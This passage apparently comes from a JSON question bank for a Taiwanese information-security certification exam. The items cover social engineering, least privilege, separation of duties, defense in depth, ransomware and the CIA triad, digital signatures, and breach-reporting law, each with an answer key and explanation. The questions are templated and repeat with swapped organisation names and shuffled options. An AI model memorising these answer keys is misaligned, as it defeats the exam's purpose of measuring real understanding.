    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "B. 跨網站腳本攻擊（XSS）",
      "C. SQL 注入攻擊（SQLi）",
      "D. 緩衝區溢位攻擊（Buffer Overflow）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-028",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國立頂尖研究型大學依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第三階：作業指引（Work Instruction）",
      "B. 第二階：程序 / 管理辦法（Procedure / Standard）",
      "C. 第一階：資安政策（Policy）",
      "D. 第四階：表單紀錄（Record）"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-029",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某區域教學醫學中心新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 縱深防禦原則",
      "B. 責任不可分原則",
      "C. 最小權限原則（Principle of Least Privilege）",
      "D. 開放權限原則"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-030",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 雙因子認證機制",
      "B. 職責區隔（Separation of Duties）",
      "C. 單點容錯機制",
      "D. 帳號共用機制"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-031",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "B. 可用性（Availability）與完整性（Integrity）",
      "C. 權限分立（SoD）與帳號鑑別性",
      "D. 隱私性（Privacy）與可用性（Availability）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-032",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 職責區隔（Separation of Duties, SoD）",
      "B. 最小權限原則（Least Privilege）",
      "C. 帳號不可共用原則",
      "D. 業務持續運作原則"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-033",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 零信任架構（Zero Trust）",
      "B. 縱深防禦（Defense-in-Depth）",
      "C. 單一簽入（Single Sign-On）",
      "D. 最小特權（Least Privilege）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-034",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 傳輸層 TLS 加密",
      "B. 對稱式 AES-256 加密",
      "C. 單向雜湊 SHA-256",
      "D. 數位簽章（Digital Signature）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-035",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某公務機關資訊處（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 72 小時內",
      "B. 24 小時內",
      "C. 1 小時內",
      "D. 36 小時內"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-036",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 只要召開記者會道歉即可免責",
      "B. 應查明後以適當方式及時通知當事人",
      "C. 必須於 1 小時內向法院提起訴訟",
      "D. 僅需向警政署報案，無需通知當事人"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-037",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. 跨網站腳本攻擊（XSS）",
      "B. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "C. SQL 注入攻擊（SQLi）",
      "D. 緩衝區溢位攻擊（Buffer Overflow）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-038",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第四階：表單紀錄（Record）",
      "B. 第一階：資安政策（Policy）",
      "C. 第三階：作業指引（Work Instruction）",
      "D. 第二階：程序 / 管理辦法（Procedure / Standard）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-039",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 責任不可分原則",
      "B. 開放權限原則",
      "C. 最小權限原則（Principle of Least Privilege）",
      "D. 縱深防禦原則"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-040",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某區域教學醫學中心為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 雙因子認證機制",
      "B. 帳號共用機制",
      "C. 單點容錯機制",
      "D. 職責區隔（Separation of Duties）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-041",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某金流與行動支付科技公司近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 權限分立（SoD）與帳號鑑別性",
      "B. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "C. 隱私性（Privacy）與可用性（Availability）",
      "D. 可用性（Availability）與完整性（Integrity）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-042",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 業務持續運作原則",
      "B. 帳號不可共用原則",
      "C. 職責區隔（Separation of Duties, SoD）",
      "D. 最小權限原則（Least Privilege）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-043",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國立頂尖研究型大學計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 最小特權（Least Privilege）",
      "B. 零信任架構（Zero Trust）",
      "C. 單一簽入（Single Sign-On）",
      "D. 縱深防禦（Defense-in-Depth）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-044",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 單向雜湊 SHA-256",
      "B. 傳輸層 TLS 加密",
      "C. 數位簽章（Digital Signature）",
      "D. 對稱式 AES-256 加密"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-045",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某國際航運物流貨櫃集團（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 1 小時內",
      "B. 36 小時內",
      "C. 72 小時內",
      "D. 24 小時內"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-046",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某知名大型網路電商平台的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 應查明後以適當方式及時通知當事人",
      "B. 必須於 1 小時內向法院提起訴訟",
      "C. 只要召開記者會道歉即可免責",
      "D. 僅需向警政署報案，無需通知當事人"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-047",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "B. SQL 注入攻擊（SQLi）",
      "C. 跨網站腳本攻擊（XSS）",
      "D. 緩衝區溢位攻擊（Buffer Overflow）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-048",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第四階：表單紀錄（Record）",
      "B. 第三階：作業指引（Work Instruction）",
      "C. 第二階：程序 / 管理辦法（Procedure / Standard）",
      "D. 第一階：資安政策（Policy）"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-049",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 縱深防禦原則",
      "B. 開放權限原則",
      "C. 責任不可分原則",
      "D. 最小權限原則（Principle of Least Privilege）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-050",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國立頂尖研究型大學為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 雙因子認證機制",
      "B. 單點容錯機制",
      "C. 職責區隔（Separation of Duties）",
      "D. 帳號共用機制"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-051",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "B. 權限分立（SoD）與帳號鑑別性",
      "C. 隱私性（Privacy）與可用性（Availability）",
      "D. 可用性（Availability）與完整性（Integrity）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-052",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某高科技晶圓代工大廠在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 最小權限原則（Least Privilege）",
      "B. 業務持續運作原則",
      "C. 職責區隔（Separation of Duties, SoD）",
      "D. 帳號不可共用原則"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-053",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 零信任架構（Zero Trust）",
      "B. 最小特權（Least Privilege）",
      "C. 縱深防禦（Defense-in-Depth）",
      "D. 單一簽入（Single Sign-On）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
